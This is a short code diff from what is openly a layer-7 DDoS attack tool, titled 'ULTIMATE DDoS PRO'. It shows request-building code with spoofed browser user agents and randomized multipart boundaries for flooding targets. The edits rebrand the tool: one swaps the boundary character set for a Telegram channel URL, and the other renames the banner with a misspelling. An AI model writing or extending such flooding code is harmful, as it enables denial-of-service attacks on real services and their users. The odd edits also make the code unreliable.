@@ -617,7 +617,7 @@ class Layer7Attacks:
         try:
             headers = {
                 'User-Agent': random.choice(REAL_UAS),
-                'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz1234567890', k=16))
+                'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundary' + ''.join(random.choices('https://t.me/CYBER_X_OF_BANGLADESHSy', k=16))
             }
             
             boundary = headers['Content-Type'].split('=')[1]
@@ -883,7 +883,7 @@ def show_stats():
     
     print(f"""
 {C.RED}{C.BOLD}╔══════════════════════════════════════════════════════════════════════════╗
-║              MAD HACKER V31.0 - ULTIMATE DDoS PRO                         ║
+║              CXOFB DDOS V31.0 - ULTIMATE DDOQS PRO                         ║
 ╠══════════════════════════════════════════════════════════════════════════╣{C.END}
 """)
     
